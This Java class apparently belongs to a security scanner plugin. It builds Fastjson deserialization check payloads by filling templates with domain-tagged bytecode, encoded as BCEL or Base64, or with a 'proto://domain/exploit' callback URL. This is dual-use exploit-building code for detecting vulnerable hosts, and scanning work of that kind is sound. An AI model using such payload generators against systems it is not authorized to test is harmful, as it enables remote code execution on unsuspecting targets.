package com.gbw.scanner.plugins.scripts.fastjson;

import com.gbw.scanner.utils.Base64Utils;
import com.gbw.scanner.utils.ClassUtil;
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class GBWFastJsonCheckPayload {

    private String name;
    private String payload;

    public GBWFastJsonCheckPayload(GBWFastJsonTplEntry entry,String domain,String tplDir,String proto) throws IOException {

        this.name = entry.getName();
        this.payload = makePayload(entry,domain,tplDir,proto);
    }

    private String makePayload(GBWFastJsonTplEntry entry,String domain,String tplDir,String proto) throws IOException {

        String checkPayload = null;

        String path = String.format("%s/%s",tplDir,entry.getName());

        String pload = new String(Files.readAllBytes(Paths.get(path)));

        if(entry.isCode()){

            byte[] checkPayloadCode = ClassUtil.insertDomainInfo(domain);
            if(entry.isCompress()){

                checkPayload = pload.replace(entry.getKey(),"$$BCEL$$" + Utility.encode(checkPayloadCode, true));

            }else{

                checkPayload = pload.replace(entry.getKey(), Base64Utils.encode(checkPayloadCode).replace("\n",""));
            }
        }else{

            String url = String.format("%s://%s/exploit",proto,domain);
            checkPayload= pload.replace(entry.getKey(),url);
        }

        return checkPayload;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getPayload() {
        return payload;
    }

    public void setPayload(String payload) {
        this.payload = payload;
    }
}
